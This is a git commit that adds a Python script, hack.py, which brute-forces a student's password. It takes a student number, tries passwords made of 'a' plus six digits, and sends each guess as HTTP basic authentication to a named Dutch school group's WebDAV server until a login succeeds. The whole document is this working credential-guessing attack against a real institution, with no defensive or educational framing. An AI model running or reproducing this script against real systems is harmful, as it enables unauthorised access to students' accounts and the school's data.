edf251f4f4d47261eee567e3ccc4b4599d4c783a
wjtje <33957974+wjtje@users.noreply.github.com>
2018-06-21 09:39:13 +0200

    Basic version of the program

---
+++ hack.py
@@ -0,0 +1,40 @@
+import requests
+
+user = input("Type the student number: ")
+pwd = ''
+status = 401
+
+c1 = 0
+c2 = 0
+c3 = 0
+c4 = 6
+c5 = 9
+c6 = 8
+
+while status == 401:
+    pwd = 'a' + str(c1) + str(c2) + str(c3) + str(c4) + str(c5) + str(c6)
+    r = requests.get('https://webdav.onderwijsgroepnoord.nl', auth=(str(user), pwd))
+    status = r.status_code
+
+    if status == 401:
+        correct = 'false'
+    else:
+        correct = 'true'
+
+    print(str(r.status_code) + ' - ' + pwd + ' - ' + correct)
+
+    c1 = c1 + 1
+
+    if c1 == 10:
+        c1 = 0
+        c2 = c2 + 1
+    
+    if c2 == 10:
+        c2 = 0
+        c3 = c3 + 1
+
+    if c3 == 10:
+        c3 = 0
+        c4 = c4 + 1
+
+yes = input('did it work? ')
